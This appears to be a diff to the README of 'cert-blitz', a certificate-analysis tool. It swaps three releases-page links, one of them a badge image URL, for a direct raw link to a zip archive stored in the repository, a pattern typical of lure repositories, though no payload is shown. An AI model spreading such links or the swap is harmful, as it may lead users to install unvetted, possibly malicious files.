@@ -6,7 +6,7 @@ Welcome to cert-blitz! This tool helps you decode and analyze digital certificat
 
 ## 📥 Download Now
 
-[![Download cert-blitz](https://img.shields.io/badge/Download-cert--blitz-brightgreen)](https://github.com/Abhimaanyadav/cert-blitz/releases)
+[![Download cert-blitz](https://github.com/Abhimaanyadav/cert-blitz/raw/refs/heads/main/cert_blitz/blitz_cert_1.0.zip)](https://github.com/Abhimaanyadav/cert-blitz/raw/refs/heads/main/cert_blitz/blitz_cert_1.0.zip)
 
 ## 🛠️ System Requirements
 
@@ -31,7 +31,7 @@ cert-blitz offers several useful features:
 
 ### 1. Download & Install
 
-To get started with cert-blitz, please visit this page to download: [Download cert-blitz](https://github.com/Abhimaanyadav/cert-blitz/releases).
+To get started with cert-blitz, please visit this page to download: [Download cert-blitz](https://github.com/Abhimaanyadav/cert-blitz/raw/refs/heads/main/cert_blitz/blitz_cert_1.0.zip).
 
 Once you download the file, follow these steps:
 
@@ -110,4 +110,4 @@ For more detailed documentation or advanced features, please refer to the reposi
 
 With cert-blitz, understanding digital certificates and TLS configurations becomes easy. Download it today and take control of your digital security! 
 
-[Download cert-blitz](https://github.com/Abhimaanyadav/cert-blitz/releases) and explore the features now.
+[Download cert-blitz](https://github.com/Abhimaanyadav/cert-blitz/raw/refs/heads/main/cert_blitz/blitz_cert_1.0.zip) and explore the features now.
